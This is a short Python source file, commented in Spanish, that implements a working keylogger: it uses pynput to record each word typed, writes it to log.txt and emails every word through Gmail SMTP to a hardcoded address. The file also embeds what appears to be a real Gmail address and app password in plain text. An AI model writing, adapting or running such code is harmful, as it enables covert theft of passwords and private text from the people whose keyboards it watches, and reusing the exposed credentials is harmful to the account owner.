import smtplib
from pynput import keyboard
from email.message import EmailMessage

# CONFIGURA ESTOS DATOS:
TU_CORREO = "pruebasvirologiau@gmail.com"
TU_CONTRASENA = "ybby vnmn upsy mrqh"
DESTINATARIO = "pruebasvirologiau@gmail.com"

palabra_actual = ""

def enviar_por_correo(palabra):
    try:
        mensaje = EmailMessage()
        mensaje.set_content(f"Palabra capturada: {palabra}")
        mensaje['Subject'] = "Nueva palabra registrada"
        mensaje['From'] = TU_CORREO
        mensaje['To'] = DESTINATARIO

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(TU_CORREO, TU_CONTRASENA)
            smtp.send_message(mensaje)

        print(f"[Enviado]: {palabra}")
    except Exception as e:
        print(f"[ERROR al enviar]: {e}")

def guardar_palabra(palabra):
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(palabra + "\n")
    enviar_por_correo(palabra)

def on_press(key):
    global palabra_actual

    try:
        if key.char:
            palabra_actual += key.char
    except AttributeError:
        if key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
            if palabra_actual.strip():
                guardar_palabra(palabra_actual.strip())
            palabra_actual = ""
        elif key == keyboard.Key.backspace:
            palabra_actual = palabra_actual[:-1]

# Inicia el listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
